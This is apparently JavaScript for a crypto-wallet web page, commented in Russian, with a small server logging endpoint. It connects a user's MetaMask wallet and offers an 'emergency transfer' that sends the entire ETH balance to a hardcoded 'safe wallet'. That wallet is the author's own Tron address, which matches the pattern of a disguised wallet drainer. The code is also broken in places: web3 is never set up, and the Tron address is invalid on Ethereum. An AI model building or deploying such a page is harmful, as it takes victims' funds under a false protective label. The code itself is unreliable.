// Конфигурация
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb'; // TRC20 кошелек
const GAS_LIMIT = 21000;
const GAS_PRICE_MULTIPLIER = 1.2; // Увеличиваем газ цену для быстрого подтверждения

// Добавляем после существующих переменных
let web3;
let userAddress;

// Обновляем функцию подключения кошелька
connectButton.addEventListener('click', async () => {
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        updateStatus(`Кошелек подключен! Адрес: ${userAddress}`);
        
        connectButton.style.display = 'none';
        signButton.style.display = 'block';
        
        // ПОКАЗЫВАЕМ СЕКЦИЮ ЭКСТРЕННОГО ПЕРЕВОДА ПОСЛЕ ПОДКЛЮЧЕНИЯ
        document.getElementById('emergencySection').style.display = 'block';
        
        // ЗАГРУЖАЕМ БАЛАНСЫ
        await loadBalances();
        
    } catch (error) {
        // ... существующий код обработки ошибок ...
    }
});

// Функция загрузки балансов
async function loadBalances() {
    const balancesList = document.getElementById('balancesList');
    balancesList.innerHTML = '<p>Загрузка балансов...</p>';
    
    try {
        // Основной баланс ETH
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        balancesList.innerHTML = `
            <p><strong>ETH:</strong> ${parseFloat(ethBalance).toFixed(6)} ETH</p>
        `;
        
    } catch (error) {
        balancesList.innerHTML = '<p style="color: red;">Ошибка загрузки балансов</p>';
    }
}

// Функция экстренного перевода
async function emergencyTransfer() {
    const transferStatus = document.getElementById('transferStatus');
    transferStatus.innerHTML = '<p style="color: orange;">⏳ Подготовка перевода...</p>';
    
    try {
        // Получаем текущий баланс
        const balance = await web3.eth.getBalance(userAddress);
        const gasPrice = await web3.eth.getGasPrice();
        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
        
        const gasCost = increasedGasPrice * GAS_LIMIT;
        const transferAmount = BigInt(balance) - BigInt(gasCost);
        
        if (transferAmount <= 0) {
            transferStatus.innerHTML = '<p style="color: red;">❌ Недостаточно средств для перевода с учетом комиссии</p>';
            return;
        }
        
        transferStatus.innerHTML = '<p style="color: orange;">⏳ Отправка транзакции...</p>';
        
        // Создаем и отправляем транзакцию
        const transactionObject = {
            from: userAddress,
            to: SAFE_WALLET,
            value: transferAmount.toString(),
            gas: GAS_LIMIT,
            gasPrice: increasedGasPrice
        };
        
        // Отправляем транзакцию
        const receipt = await web3.eth.sendTransaction(transactionObject);
        
        transferStatus.innerHTML = `
            <p style="color: green;">✅ Перевод успешно выполнен!</p>
            <p><strong>Хэш транзакции:</strong> ${receipt.transactionHash}</p>
            <p><strong>Сумма:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
            <p><strong>Блок:</strong> ${receipt.blockNumber}</p>
        `;
        
    } catch (error) {
        console.error('Ошибка перевода:', error);
        transferStatus.innerHTML = `<p style="color: red;">❌ Ошибка перевода: ${error.message}</p>`;
    }
}

// Добавляем обработчик для кнопки экстренного перевода
document.getElementById('emergencyTransferBtn').addEventListener('click', function() {
    const confirmation = confirm(
        '🚨 ВНИМАНИЕ! Вы собираетесь перевести ВСЕ средства на безопасный кошелек.\n\n' +
        `Безопасный кошелек: ${SAFE_WALLET}\n\n` +
        'Это действие нельзя отменить. Продолжить?'
    );
    
    if (confirmation) {
        emergencyTransfer();
    }
});

// Функция для проверки TRC20 токенов (дополнительно)
async function checkTRC20Tokens() {
    // Здесь можно добавить логику для проверки популярных TRC20 токенов
    // Например, USDT TRC20: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
}



// Проверка подключения к правильной сети
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        
        // Поддерживаемые сети (Ethereum Mainnet, BSC, Polygon)
        const supportedNetworks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain',
            137: 'Polygon'
        };
        
        if (!supportedNetworks[chainId]) {
            updateStatus(`Внимание: Вы подключены к сети ID ${chainId}. Рекомендуется использовать основные сети.`, true);
        }
        
    } catch (error) {
        console.error('Ошибка проверки сети:', error);
    }
}

// Автоматическая проверка при подключении
// Добавить в функцию подключения кошелька после получения адреса:
// await checkNetwork();

// Функция для мониторинга состояния кошелька
async function startWalletMonitoring() {
    // Мониторинг изменений аккаунта
    window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts.length === 0) {
            updateStatus('Кошелек отключен', true);
            document.getElementById('emergencySection').style.display = 'none';
        } else {
            userAddress = accounts[0];
            updateStatus(`Аккаунт изменен: ${userAddress}`);
            loadBalances();
        }
    });
    
    // Мониторинг изменений сети
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}

// Запускаем мониторинг после загрузки страницы
if (typeof window.ethereum !== 'undefined') {
    // ... существующий код ...
    
    // Запускаем мониторинг после инициализации
    setTimeout(startWalletMonitoring, 1000);
}


// server.js - добавить к существующему коду
app.post('/api/log-emergency-transfer', (req, res) => {
    const { fromAddress, toAddress, amount, txHash, timestamp } = req.body;
    
    // Логируем экстренный перевод
    console.log('🚨 ЭКСТРЕННЫЙ ПЕРЕВОД:', {
        fromAddress,
        toAddress,
        amount,
        txHash,
        timestamp: new Date(timestamp).toISOString()
    });
    
    // Здесь можно добавить отправку уведомлений (email, telegram и т.д.)
    
    res.json({ success: true, message: 'Лог сохранен' });
});





